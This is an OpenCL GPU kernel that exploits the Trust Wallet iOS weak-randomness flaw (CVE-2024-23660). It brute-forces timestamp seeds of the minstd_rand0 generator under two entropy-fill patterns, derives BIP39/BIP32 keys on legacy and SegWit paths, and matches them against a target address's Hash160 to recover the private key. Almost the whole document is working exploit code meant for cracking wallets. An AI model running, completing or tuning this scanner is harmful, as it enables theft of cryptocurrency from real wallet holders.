// Trust Wallet iOS Vulnerability (CVE-2024-23660) — LCG/minstd_rand0 GPU Scanner
//
// PRNG: std::minstd_rand0  (Park-Miller Lehmer LCG)
//   x_{n+1} = (16807 * x_n) mod (2^31 - 1)
//   Output range: [1, 2_147_483_646]  (MSB of every output is always 0)
//   Seed=0 is normalised to 1 (C++ standard, libstdc++/libc++ behaviour)
//
// Two entropy-fill strategies are scanned because the exact C++ byte-fill
// pattern in the original iOS binary has not been publicly confirmed:
//
//   BytePerCall  — 16 LCG calls, entropy[i] = state & 0xFF
//                  Matches: std::generate_n(buf, 16, [&]{ return rng() & 0xFF; })
//
//   WordPerCall  — 4 LCG calls, each stored as little-endian uint32
//                  Matches: for(i=0;i<4;i++) memcpy(buf+i*4, &rng(), 4)
//                  NOTE: byte[3,7,11,15] are always 0x00 (output < 2^31)
//
// Two derivation paths:
//   m/44'/0'/0'/0/0  P2PKH   (legacy 1...)
//   m/84'/0'/0'/0/0  P2WPKH  (native SegWit bc1q...)
//
// One kernel handles all 4 combinations. Global work size = 4 x range.
//   gid -> timestamp = gid/4 + offset
//          combo     = gid%4
//   combo 0: BytePerCall + P2PKH  (purpose 44)
//   combo 1: WordPerCall + P2PKH  (purpose 44)
//   combo 2: BytePerCall + P2WPKH (purpose 84)
//   combo 3: WordPerCall + P2WPKH (purpose 84)
//
// Result encoding:
//   results[idx] = (ulong)timestamp | ((ulong)combo << 32)

// ---------------------------------------------------------------------------
// minstd_rand0 step
// ---------------------------------------------------------------------------
static uint minstd_next(uint state) {
    return (uint)(((ulong)state * 16807UL) % 2147483647UL);
}

// ---------------------------------------------------------------------------
// Strategy 0: BytePerCall — 16 calls, take lowest byte of each output
// ---------------------------------------------------------------------------
static void lcg_entropy_byte(
    uint seed,
    __private uchar entropy[16])
{
    uint s = (seed == 0u) ? 1u : seed;
    for (int i = 0; i < 16; i++) {
        s = minstd_next(s);
        entropy[i] = (uchar)(s & 0xFFu);
    }
}

// ---------------------------------------------------------------------------
// Strategy 1: WordPerCall — 4 calls, store full u32 as little-endian 4 bytes
// byte[3,7,11,15] are always 0x00 because minstd output < 2^31
// ---------------------------------------------------------------------------
static void lcg_entropy_word(
    uint seed,
    __private uchar entropy[16])
{
    uint s = (seed == 0u) ? 1u : seed;
    for (int i = 0; i < 4; i++) {
        s = minstd_next(s);
        entropy[i*4+0] = (uchar)( s         & 0xFFu);
        entropy[i*4+1] = (uchar)((s >>  8u) & 0xFFu);
        entropy[i*4+2] = (uchar)((s >> 16u) & 0xFFu);
        entropy[i*4+3] = (uchar)((s >> 24u) & 0xFFu); // Always 0x00
    }
}

// ---------------------------------------------------------------------------
// Main kernel
// ---------------------------------------------------------------------------
__kernel void trust_wallet_lcg_crack(
    __global ulong* results,
    __global uint*  result_count,
    ulong  target_h160_part1,   // bytes  0-7  packed LE
    ulong  target_h160_part2,   // bytes  8-15 packed LE
    uint   target_h160_part3,   // bytes 16-19 packed LE
    uint   offset,              // start_timestamp
    uint   range                // number of timestamps to check
) {
    uint gid       = get_global_id(0);
    uint combo     = gid & 3u;           // gid % 4 : which (strategy, path) combo
    uint ts_offset = gid >> 2u;          // gid / 4 : timestamp index

    // Bounds check: ghost work items from alignment padding must be skipped
    if (ts_offset >= range) return;

    uint timestamp = ts_offset + offset;

    // ---- Entropy generation ------------------------------------------------
    uchar entropy[16];
    if ((combo & 1u) == 0u) {
        lcg_entropy_byte(timestamp, entropy);
    } else {
        lcg_entropy_word(timestamp, entropy);
    }

    // ---- BIP32 derivation path ---------------------------------------------
    // combo 0,1 -> purpose 44 (P2PKH)
    // combo 2,3 -> purpose 84 (P2WPKH)
    uint purpose = (combo < 2u) ? 44u : 84u;

    // ---- BIP39: entropy -> mnemonic -> seed --------------------------------
    uchar seed[64];
    bip39_entropy_to_seed_complete(entropy, seed);

    // ---- BIP32: master key -------------------------------------------------
    extended_private_key_t mk;
    new_master_from_seed(0, seed, &mk);

    // ---- Derive m/purpose'/0'/0'/0/0 ---------------------------------------
    extended_private_key_t k_purpose;
    hardened_private_child_from_private(&mk, &k_purpose, purpose);

    extended_private_key_t k_coin;
    hardened_private_child_from_private(&k_purpose, &k_coin, 0u);

    extended_private_key_t k_account;
    hardened_private_child_from_private(&k_coin, &k_account, 0u);

    extended_private_key_t k_change;
    normal_private_child_from_private(&k_account, &k_change, 0u);

    extended_private_key_t k_addr;
    normal_private_child_from_private(&k_change, &k_addr, 0u);

    // ---- Public key -> Hash160 ---------------------------------------------
    extended_public_key_t pub;
    public_from_private(&k_addr, &pub);

    uchar hash160[20];
    identifier_for_public_key(&pub, hash160);

    // ---- Pack and compare --------------------------------------------------
    ulong h1 = 0UL, h2 = 0UL;
    uint  h3 = 0u;
    for (int i = 0; i < 8; i++) h1 |= ((ulong)hash160[i])     << (i*8);
    for (int i = 0; i < 8; i++) h2 |= ((ulong)hash160[i + 8]) << (i*8);
    for (int i = 0; i < 4; i++) h3 |= ((uint) hash160[i + 16])<< (i*8);

    if (h1 == target_h160_part1 &&
        h2 == target_h160_part2 &&
        h3 == target_h160_part3)
    {
        uint idx = atomic_inc(result_count);
        if (idx < 1024u) {
            // Pack: low 32 bits = timestamp, high 32 bits = combo index
            results[idx] = (ulong)timestamp | ((ulong)combo << 32);
        }
    }
}
